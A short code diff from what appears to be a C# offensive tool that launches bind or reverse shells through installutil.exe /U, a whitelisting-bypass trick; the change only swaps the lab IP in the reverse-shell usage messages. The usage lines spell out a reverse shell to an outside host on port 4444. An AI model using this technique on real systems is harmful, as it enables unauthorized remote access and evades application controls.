@@ -113,13 +113,13 @@ $client.Close();";
             Console.WriteLine("[-] Must specify shell type : none, bind, reverse");
             Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U " + filename);
             Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U /shelltype=bind " + filename);
-            Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U /shelltype=reverse /host=192.168.49.112 /port=4444 " + filename);
+            Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U /shelltype=reverse /host=192.168.49.116 /port=4444 " + filename);
             return;
         }
         else if (shellType == "reverse" && (host == null || port == null))
         {
             Console.WriteLine("[-] Must specify remote host and port for a reverse shell");
-            Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U /shelltype=reverse /host=192.168.49.112 /port=4444 " + filename);
+            Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U /shelltype=reverse /host=192.168.49.116 /port=4444 " + filename);
             return;
         }
 
